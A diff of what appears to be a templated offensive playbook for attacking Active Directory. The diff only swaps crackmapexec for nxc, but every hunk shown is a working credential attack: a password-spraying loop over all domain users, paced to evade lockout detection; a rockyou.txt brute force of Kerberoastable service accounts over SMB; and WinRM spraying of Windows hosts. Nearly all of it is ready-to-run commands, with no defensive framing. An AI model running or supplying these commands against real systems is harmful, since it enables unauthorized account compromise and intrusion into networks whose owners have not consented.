@@ -32,10 +32,10 @@ kerbrute userenum /usr/share/wordlists/seclists/Usernames/top-usernames-shortlis
 Spray a small set of common passwords across all users. Low and slow to avoid mass lockout.
 
 ```bash
-# Spray with crackmapexec -- one password at a time, all users
+# Spray with nxc -- one password at a time, all users
 for PASS in "Password1" "Welcome1" "Summer2024!" "Company123!" "{{domain}}2024!"; do
   echo "[*] Spraying: $PASS"
-  crackmapexec smb {{dc}} -u /tmp/domain_users.txt -p "$PASS" \
+  nxc smb {{dc}} -u /tmp/domain_users.txt -p "$PASS" \
     --continue-on-success --no-bruteforce 2>&1 | grep -v "\[-\]" | head -20
   sleep {{delayMax}}
 done
@@ -57,7 +57,7 @@ SPN_USERS=$(jq -r '.ad.kerberoastable_spns[]? // empty' {{logDir}}/recon_deliver
 
 if [ -n "$SPN_USERS" ]; then
   echo "$SPN_USERS" > /tmp/svc_accounts.txt
-  crackmapexec smb {{dc}} -u /tmp/svc_accounts.txt \
+  nxc smb {{dc}} -u /tmp/svc_accounts.txt \
     -p /usr/share/wordlists/rockyou.txt --continue-on-success 2>&1 | \
     grep "\[+\]" | head -10
 fi
@@ -72,7 +72,7 @@ WIN10_IP=$(echo '{{hosts}}' | python3 -c "import sys,json; h=json.load(sys.stdin
 WIN11_IP=$(echo '{{hosts}}' | python3 -c "import sys,json; h=json.load(sys.stdin); print(h[1]['ip'])")
 
 for HOST in "$WIN10_IP" "$WIN11_IP"; do
-  crackmapexec winrm "$HOST" -u /tmp/domain_users.txt -p "Password1" \
+  nxc winrm "$HOST" -u /tmp/domain_users.txt -p "Password1" \
     --continue-on-success --no-bruteforce 2>&1 | grep "\[+\]" | head -5
   sleep {{delayMax}}
 done
